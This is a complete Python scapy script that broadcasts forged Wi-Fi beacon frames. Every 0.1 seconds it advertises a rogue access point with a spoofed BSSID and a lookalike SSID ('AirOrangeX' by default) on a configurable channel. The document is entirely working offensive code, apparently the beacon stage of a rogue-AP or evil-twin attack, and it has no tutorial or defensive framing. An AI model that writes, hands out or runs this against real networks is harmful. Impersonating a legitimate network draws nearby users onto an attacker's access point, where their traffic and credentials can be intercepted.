#!/usr/bin/env python3
import os, time
from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp

IFACE = os.environ.get("MON_IFACE", "wlan0mon")
CHANNEL = int(os.environ.get("CHANNEL", 6))
ROGUE_BSSID = os.environ.get("ROGUE_BSSID", "DE:AD:BE:EF:00:01")
ROGUE_SSID = os.environ.get("ROGUE_SSID", "AirOrangeX")

def build_beacon(bssid, ssid, seq, channel):
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff",
                   addr2=bssid, addr3=bssid, SC=seq << 4)
    beacon = Dot11Beacon(cap="ESS+privacy")
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    rates = Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x24\x30\x48\x6c")
    dsset = Dot11Elt(ID="DSset", info=chr(channel).encode())
    return RadioTap()/dot11/beacon/essid/rates/dsset

def main():
    print(f"[*] Rogue BSSID {ROGUE_BSSID} broadcasting SSID '{ROGUE_SSID}' on ch {CHANNEL}")
    seq = 0
    try:
        while True:
            pkt = build_beacon(ROGUE_BSSID, ROGUE_SSID, seq, CHANNEL)
            sendp(pkt, iface=IFACE, verbose=False)
            seq = (seq + 1) % 4096
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\n[*] Stopped.")

if __name__ == "__main__":
    main()
